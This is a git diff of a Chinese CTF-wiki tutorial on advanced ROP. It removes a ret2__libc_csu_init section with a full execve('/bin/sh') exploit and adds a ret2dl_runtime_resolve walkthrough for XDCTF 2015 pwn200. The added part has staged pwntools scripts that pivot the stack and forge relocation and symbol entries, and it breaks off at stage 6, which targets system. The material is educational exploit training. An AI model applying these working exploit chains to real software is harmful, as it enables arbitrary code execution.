@@ -1,285 +1,741 @@
+---
+typora-root-url: ..\..
+---
+
 # 高级ROP
 
-高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些比较有意思的gadgets。
+高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。
 
-# ret2__libc_scu_init
+# ret2_dl_runtime_resolve
 
 ## 原理
 
-在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)
+要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。
 
-```assembly
-.text:00000000004005C0 ; void _libc_csu_init(void)
-.text:00000000004005C0                 public __libc_csu_init
-.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
-.text:00000000004005C0                 push    r15
-.text:00000000004005C2                 push    r14
-.text:00000000004005C4                 mov     r15d, edi
-.text:00000000004005C7                 push    r13
-.text:00000000004005C9                 push    r12
-.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
-.text:00000000004005D2                 push    rbp
-.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
-.text:00000000004005DA                 push    rbx
-.text:00000000004005DB                 mov     r14, rsi
-.text:00000000004005DE                 mov     r13, rdx
-.text:00000000004005E1                 sub     rbp, r12
-.text:00000000004005E4                 sub     rsp, 8
-.text:00000000004005E8                 sar     rbp, 3
-.text:00000000004005EC                 call    _init_proc
-.text:00000000004005F1                 test    rbp, rbp
-.text:00000000004005F4                 jz      short loc_400616
-.text:00000000004005F6                 xor     ebx, ebx
-.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
-.text:0000000000400600
-.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
-.text:0000000000400600                 mov     rdx, r13
-.text:0000000000400603                 mov     rsi, r14
-.text:0000000000400606                 mov     edi, r15d
-.text:0000000000400609                 call    qword ptr [r12+rbx*8]
-.text:000000000040060D                 add     rbx, 1
-.text:0000000000400611                 cmp     rbx, rbp
-.text:0000000000400614                 jnz     short loc_400600
-.text:0000000000400616
-.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
-.text:0000000000400616                 add     rsp, 8
-.text:000000000040061A                 pop     rbx
-.text:000000000040061B                 pop     rbp
-.text:000000000040061C                 pop     r12
-.text:000000000040061E                 pop     r13
-.text:0000000000400620                 pop     r14
-.text:0000000000400622                 pop     r15
-.text:0000000000400624                 retn
-.text:0000000000400624 __libc_csu_init endp
-```
+我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下
 
-这里我们可以利用以下几点
+1. 控制程序执行dl_resolve函数
+   - 给定Link_map以及index两个参数。
+   - 当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。
+2. 控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。
+3. 伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。
+4. 伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。
 
-- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。
-- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
-- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。
+**此外，这个攻击成功的很必要的条件**
+
+- **dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。**
+- **dl_resolve函数最后的解析根本上依赖于所给定的字符串。**
+
+注意：
+
+- 符号版本信息
+  - 最好使得ndx = VERSYM[ (reloc->r_info) >> 8] 的值为0，以便于防止找不到的情况。
+- 重定位表项
+  - r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。
+
+## 攻击条件
+
+说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。
 
 ## 示例
 
-这里我们以蒸米的一步一步学ROP之linux_x64篇中level5为例进行介绍。首先检查程序的安全保护
+这里以XDCTF 2015的pwn200为例。主要参考
+
+1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入浅出。
+2. https://www.math1as.com/index.php/archives/341/
+
+首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。
 
 ```shell
-➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5   
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
+➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main
 ```
 
-程序为64位，开启了堆栈不可执行保护。
+在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。
 
-其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出
+1. 利用正常的代码来使用该技巧从而获取shell。
 
-```C
-ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-80h]@1
+   stage 1 测试控制程序执行write函数的效果。
 
-  return read(0, &buf, 0x200uLL);
-}
+   stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。
+
+   stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。
+
+2. 利用roputils中已经集成好的工具来实现攻击，从而获取shell。
+
+### 正常攻击
+
+显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。
+
+```shell
+gef➤  pattern create 200
+[+] Generating a pattern of 200 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+[+] Saved as '$_gef0'
+gef➤  r
+Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main 
+Welcome to XDCTF2015~!
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616164 in ?? ()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
+$eax   : 0x000000c9
+$ebx   : 0x00000000
+$ecx   : 0xffffcc6c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$edx   : 0x00000100
+$esp   : 0xffffcce0  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
+$ebp   : 0x62616163 ("caab"?)
+$esi   : 0xf7fac000  →  0x001b1db0
+$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001
+$eip   : 0x62616164 ("daab"?)
+$cs    : 0x00000023
+$ss    : 0x0000002b
+$ds    : 0x0000002b
+$es    : 0x0000002b
+$fs    : 0x00000000
+$gs    : 0x00000063
+$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
+[!] Cannot disassemble from $PC
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
+['0xffffcce0', 'l8']
+8
+0xffffcce0│+0x00: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
+0xffffcce4│+0x04: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
+0xffffcce8│+0x08: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
+0xffffccec│+0x0c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
+0xffffccf0│+0x10: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
+0xffffccf4│+0x14: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
+0xffffccf8│+0x18: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
+0xffffccfc│+0x1c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern search 
+[!] Syntax
+pattern search PATTERN [SIZE]
+gef➤  pattern search 0x62616164
+[+] Searching '0x62616164'
+[+] Found at offset 112 (little-endian search) likely
 ```
 
-简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。
+#### stage 1
 
-**注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。**
+这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步
 
-基本利用思路如下
+1. 将栈迁移到bss段。
+2. 控制write函数输出相应字符串。
 
-- 利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数
-- 根据libcsearcher获取对应libc版本以及execve函数地址
-- 再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。
-- 再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。
-
-exp如下
+这里主要使用了pwntools中的ROP模块。具体代码如下
 
 ```python
 from pwn import *
-from LibcSearcher import LibcSearcher
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
 
-#context.log_level = 'debug'
+offset = 112
+bss_addr = elf.bss()
 
-level5 = ELF('./level5')
-sh = process('./level5')
+r.recvuntil('Welcome to XDCTF2015~!\n')
 
-write_got = level5.got['write']
-read_got = level5.got['read']
-main_addr = level5.symbols['main']
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = 'b' * 8
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
 
+# write cmd="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+rop.write(1, base_stage + 80, len(sh))
+rop.raw('a' * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw('a' * (100 - len(rop.chain())))
 
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = 'a' * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
-        r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += 'a' * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
-
-
-sh.recvuntil('Hello, World\n')
-# RDI, RSI, RDX, RCX, R8, R9, more on the stack
-# write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(sh.recv(8))
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-execve_addr = libc_base + libc.dump('execve')
-log.success('execve_addr ' + hex(execve_addr))
-#gdb.attach(sh)
-
-# read(0,bss_base,16)
-# read execve_addr and /bin/sh\x00
-sh.recvuntil('Hello, World\n')
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
-
-sh.recvuntil('Hello, World\n')
-# execve(bss_base+8)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()
+r.sendline(rop.chain())
+r.interactive()
 ```
 
-## 思考
+结果如下
 
-### 改进
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage1.py
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 120912
+[*] Loaded cached gadgets for './main'
+[*] Switching to interactive mode
+/bin/sh[*] Got EOF while reading in interactive
 
-在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法
-
-#### 改进1-提前控制rbx与rbp
-
-可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少16字节，即我们所需的字节数只需要112。
-
-#### 改进2-多次利用
-
-其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件
-
-- 漏洞可以被多次触发
-- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。
-
-**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**
-
-### gadget
-
-其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数
-
-```text
-_init
-_start
-call_gmon_start
-deregister_tm_clones
-register_tm_clones
-__do_global_dtors_aux
-frame_dummy
-__libc_csu_init
-__libc_csu_fini
-_fini
 ```
 
-我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。
+#### stage 2
 
-需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器
+在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。
 
-- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
-- 利用中间部分的代码控制了rdx，rsi，edi。
+```python
+from pwn import *
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
 
-而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，**可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。**而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。
+offset = 112
+bss_addr = elf.bss()
 
-```assembly
-gef➤  x/5i 0x000000000040061A
-   0x40061a <__libc_csu_init+90>:	pop    rbx
-   0x40061b <__libc_csu_init+91>:	pop    rbp
-   0x40061c <__libc_csu_init+92>:	pop    r12
-   0x40061e <__libc_csu_init+94>:	pop    r13
-   0x400620 <__libc_csu_init+96>:	pop    r14
-gef➤  x/5i 0x000000000040061b
-   0x40061b <__libc_csu_init+91>:	pop    rbp
-   0x40061c <__libc_csu_init+92>:	pop    r12
-   0x40061e <__libc_csu_init+94>:	pop    r13
-   0x400620 <__libc_csu_init+96>:	pop    r14
-   0x400622 <__libc_csu_init+98>:	pop    r15
-gef➤  x/5i 0x000000000040061A+3
-   0x40061d <__libc_csu_init+93>:	pop    rsp
-   0x40061e <__libc_csu_init+94>:	pop    r13
-   0x400620 <__libc_csu_init+96>:	pop    r14
-   0x400622 <__libc_csu_init+98>:	pop    r15
-   0x400624 <__libc_csu_init+100>:	ret 
-gef➤  x/5i 0x000000000040061e
-   0x40061e <__libc_csu_init+94>:	pop    r13
-   0x400620 <__libc_csu_init+96>:	pop    r14
-   0x400622 <__libc_csu_init+98>:	pop    r15
-   0x400624 <__libc_csu_init+100>:	ret    
-   0x400625:	nop
-gef➤  x/5i 0x000000000040061f
-   0x40061f <__libc_csu_init+95>:	pop    rbp
-   0x400620 <__libc_csu_init+96>:	pop    r14
-   0x400622 <__libc_csu_init+98>:	pop    r15
-   0x400624 <__libc_csu_init+100>:	ret    
-   0x400625:	nop
-gef➤  x/5i 0x0000000000400620
-   0x400620 <__libc_csu_init+96>:	pop    r14
-   0x400622 <__libc_csu_init+98>:	pop    r15
-   0x400624 <__libc_csu_init+100>:	ret    
-   0x400625:	nop
-   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
-gef➤  x/5i 0x0000000000400621
-   0x400621 <__libc_csu_init+97>:	pop    rsi
-   0x400622 <__libc_csu_init+98>:	pop    r15
-   0x400624 <__libc_csu_init+100>:	ret    
-   0x400625:	nop
-gef➤  x/5i 0x000000000040061A+9
-   0x400623 <__libc_csu_init+99>:	pop    rdi
-   0x400624 <__libc_csu_init+100>:	ret    
-   0x400625:	nop
-   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
-   0x400630 <__libc_csu_fini>:	repz ret 
+r.recvuntil('Welcome to XDCTF2015~!\n')
+
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# write cmd="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+write_index = (elf.plt['write'] - plt0) / 16 - 1
+write_index *= 8
+rop.raw(plt0)
+rop.raw(write_index)
+# fake ret addr of write
+rop.raw('bbbb')
+rop.raw(1)
+rop.raw(base_stage + 80)
+rop.raw(len(sh))
+rop.raw('a' * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw('a' * (100 - len(rop.chain())))
+
+r.sendline(rop.chain())
+r.interactive()
+
+```
+
+效果如下，仍然输出了cmd对应的字符串。
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage2.py
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 123406
+[*] Loaded cached gadgets for './main'
+[*] Switching to interactive mode
+/bin/sh[*] Got EOF while reading in interactive
+```
+
+#### stage 3
+
+这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。
+
+鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下
+
+```shell
+➜  ret2dlresolve git:(master) ✗ readelf -r main  
+
+重定位节 '.rel.dyn' 位于偏移量 0x318 含有 3 个条目：
+ 偏移量     信息    类型              符号值      符号名称
+08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
+0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0
+0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0
+
+重定位节 '.rel.plt' 位于偏移量 0x330 含有 5 个条目：
+ 偏移量     信息    类型              符号值      符号名称
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
+0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
+0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
+```
+
+可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下
+
+```python
+from pwn import *
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
+
+offset = 112
+bss_addr = elf.bss()
+
+r.recvuntil('Welcome to XDCTF2015~!\n')
+
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# write sh="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+# making base_stage+24 ---> fake reloc
+index_offset = base_stage + 24 - rel_plt
+write_got = elf.got['write']
+r_info = 0x607
+
+rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw('bbbb')
+rop.raw(1)
+rop.raw(base_stage + 80)
+rop.raw(len(sh))
+rop.raw(write_got)  # fake reloc
+rop.raw(r_info)
+rop.raw('a' * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw('a' * (100 - len(rop.chain())))
+
+r.sendline(rop.chain())
+r.interactive()
+```
+
+最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage3.py
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 126063
+[*] Loaded cached gadgets for './main'
+[*] Switching to interactive mode
+/bin/sh[*] Got EOF while reading in interactive
+```
+
+#### stage 4
+
+stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607>>8=0x6。因此，我们知道write对应的符号地址为0x8048238。
+
+```shell
+➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main
+
+main：     文件格式 elf32-i386
+
+Contents of section .dynsym:
+ 80481d8 00000000 00000000 00000000 00000000  ................
+ 80481e8 33000000 00000000 00000000 12000000  3...............
+ 80481f8 27000000 00000000 00000000 12000000  '...............
+ 8048208 52000000 00000000 00000000 20000000  R........... ...
+ 8048218 20000000 00000000 00000000 12000000   ...............
+ 8048228 3a000000 00000000 00000000 12000000  :...............
+ 8048238 4c000000 00000000 00000000 12000000  L...............
+ 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........
+ 8048258 0b000000 3c860408 04000000 11001000  ....<...........
+ 8048268 1a000000 40a00408 04000000 11001a00  ....@...........
+```
+
+这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。
+
+```python
+from pwn import *
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
+
+offset = 112
+bss_addr = elf.bss()
+
+r.recvuntil('Welcome to XDCTF2015~!\n')
+
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# write sh="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+
+## making fake write symbol
+fake_sym_addr = base_stage + 32
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
+                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
+fake_sym_addr = fake_sym_addr + align
+index_dynsym = (
+    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
+fake_write_sym = flat([0x4c, 0, 0, 0x12])
+
+## making fake write relocation
+
+# making base_stage+24 ---> fake reloc
+index_offset = base_stage + 24 - rel_plt
+write_got = elf.got['write']
+r_info = (index_dynsym << 8) | 0x7
+fake_write_reloc = flat([write_got, r_info])
+
+rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw('bbbb')
+rop.raw(1)
+rop.raw(base_stage + 80)
+rop.raw(len(sh))
+rop.raw(fake_write_reloc)  # fake write reloc
+rop.raw('a' * align)  # padding
+rop.raw(fake_write_sym)  # fake write symbol
+rop.raw('a' * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw('a' * (100 - len(rop.chain())))
+
+r.sendline(rop.chain())
+r.interactive()
+```
+
+具体效果如下
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage4.py
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 128795
+[*] Loaded cached gadgets for './main'
+[*] Switching to interactive mode
+/bin/sh[*] Got EOF while reading in interactive
+
+```
+
+#### stage 5
+
+这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。
+
+```python
+from pwn import *
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
+
+offset = 112
+bss_addr = elf.bss()
+
+r.recvuntil('Welcome to XDCTF2015~!\n')
+
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# write sh="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+
+## making fake write symbol
+fake_sym_addr = base_stage + 32
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
+                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
+fake_sym_addr = fake_sym_addr + align
+index_dynsym = (
+    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
+# plus 10 since the size of Elf32_Sym is 16.
+st_name = fake_sym_addr + 0x10 - dynstr
+fake_write_sym = flat([st_name, 0, 0, 0x12])
+
+## making fake write relocation
+
+# making base_stage+24 ---> fake reloc
+index_offset = base_stage + 24 - rel_plt
+write_got = elf.got['write']
+r_info = (index_dynsym << 8) | 0x7
+fake_write_reloc = flat([write_got, r_info])
+
+rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw('bbbb')
+rop.raw(1)
+rop.raw(base_stage + 80)
+rop.raw(len(sh))
+rop.raw(fake_write_reloc)  # fake write reloc
+rop.raw('a' * align)  # padding
+rop.raw(fake_write_sym)  # fake write symbol
+rop.raw('write\x00')  # there must be a \x00 to mark the end of string
+rop.raw('a' * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw('a' * (100 - len(rop.chain())))
+
+r.sendline(rop.chain())
+r.interactive()
+```
+
+效果如下
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage5.py      
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 129249
+[*] Loaded cached gadgets for './main'
+[*] Switching to interactive mode
+/bin/sh[*] Got EOF while reading in interactive
+```
+
+#### stage 6
+
+这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下
+
+```python
+from pwn import *
+elf = ELF('main')
+r = process('./main')
+rop = ROP('./main')
+
+offset = 112
+bss_addr = elf.bss()
+
